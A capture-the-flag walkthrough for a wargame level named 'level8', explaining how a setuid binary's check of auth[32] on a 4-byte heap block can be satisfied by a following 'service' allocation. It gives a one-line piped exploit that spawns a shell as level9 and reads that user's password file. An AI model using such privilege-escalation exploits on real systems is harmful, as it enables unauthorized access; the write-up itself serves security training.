# Level8 Walkthrough

Binary is setuid `level9`. It is a small command loop: `auth`, `reset`, `service`,
`login`.

```c
char *auth = NULL;
char *service = NULL;

int main(void) {
  char line[128];

  while (1) {
    printf("%p, %p \n", auth, service);
    fgets(line, 128, stdin);

    if (strncmp(line, "auth ", 5) == 0) {
      auth = malloc(4);
      if (strlen(line + 5) <= 30)
        strcpy(auth, line + 5);
    }
    if (strncmp(line, "service", 6) == 0)
      service = strdup(line + 7);
    if (strncmp(line, "login", 5) == 0) {
      if (auth[32] != 0)
        system("/bin/sh");
    }
  }
}
```

## Vulnerability

`auth` is allocated with `malloc(4)` (4 bytes), but `login` checks `auth[32]`, well
past the end of the block. That byte belongs to whatever was allocated next on the
heap. `service = strdup(line + 7)` allocates right after `auth`, so the text passed
to `service` lands at `auth + 16` and covers `auth[32]`. Any non-zero byte there
passes the check and opens a shell as `level9`.

## Exploitation

- `auth ` allocates the 4-byte block.
- `service ` + a long string fills the heap right after it, so `auth[32]` is non-zero.
- `login` then runs `system("/bin/sh")`.

```sh
(echo "auth "; echo "service AAAAAAAAAAAAAAAAAAAA"; echo "login"; cat) | ./level8
```

The `%p, %p` line confirms the layout: `auth = 0x804a008`, `service = 0x804a018`
(16 bytes after auth). In the shell, `cat /home/user/level9/.pass`.

